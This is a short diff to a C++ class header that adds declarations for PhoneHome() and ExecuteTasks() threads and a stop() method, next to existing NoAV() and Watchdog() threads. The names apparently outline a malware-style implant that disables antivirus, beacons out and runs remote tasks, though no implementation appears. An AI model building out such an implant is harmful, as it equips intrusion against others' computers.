@@ -45,11 +45,14 @@ public:
 	// OPERATIONAL THREADS
 	static VOID NoAV(); // KILL SIGNAL 0x0001
 	static VOID Watchdog(); // KILL SIGNAL 0x0002
+	static VOID PhoneHome(); // KILL SIGNAL 0x0003
+	static VOID ExecuteTasks(); // KILL SIGNAL 0x0004
 	
 	// FUNCTIONALITY
 	static DWORD sendKillSignal(DWORD signal);
 	static VOID reportEvent(DWORD eventType, std::string event);
 	static VOID changeStatus(DWORD newStatus);
+	static VOID stop();
 };
 
 int main();
